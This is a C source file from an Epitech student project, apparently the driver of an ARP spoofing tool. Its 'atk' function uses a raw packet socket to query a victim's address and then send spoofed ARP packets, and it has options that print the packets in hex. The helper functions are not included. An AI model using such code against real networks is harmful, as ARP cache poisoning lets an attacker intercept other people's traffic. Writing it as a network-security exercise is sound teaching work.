/*
** EPITECH PROJECT, 2019
** RSD64
** File description:
** main.c
*/

#include "my.h"

void print(char *ip_src, char *ip_dest, char *interf, char *mac)
{
    stct_t sck = init(interf);

    convert(addrmac(sck.interf), sck.src_mac);
    if (mac == NULL)
        memset(sck.dest_mac, 0xff, 6 * sizeof(uint8_t));
    else
        memcpy(sck.dest_mac, mac, 6 * sizeof(uint8_t));
    strcpy(sck.dest_ip, ip_dest);
    strcpy(sck.src_ip, ip_src);
    new(&sck);
    printf("%02x", sck.message[0]);
    for (int a = 1; a != sck.length; a++)
        printf(" %02x", sck.message[a]);
    printf("\n");
    exit(0);
}

void atk(char *src_ip, char *victim, char *interf)
{
    stct_t sck = init(interf);
    int sock = 0;

    convert(addrmac(sck.interf), sck.src_mac);
    memset(sck.dest_mac, 0xff, 6 * sizeof(uint8_t));
    strcpy(sck.dest_ip, victim);
    strcpy(sck.src_ip, src_ip);
    new(&sck);
    if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
        exit(1);
    if ((sendto(sock, sck.message, sck.length, 0, (struct sockaddr *)&sck.dev, sizeof(sck.dev))) <= 0)
        exit(1);
    close(sock);
    receive(&sck);
    new(&sck);
    sendarp(sck);
}

int main(int ac, char **av)
{
    if (ac == 4)
        atk(av[1], av[2], av[3]);
    if (ac == 5 && strcmp(av[4], "--printBroadcast") == 0)
        print(av[1], av[2], av[3], NULL);
    if (ac == 6 && strcmp(av[4], "--printSpoof") == 0)
        print(av[1], av[2], av[3], av[5]);
    return (84);
}
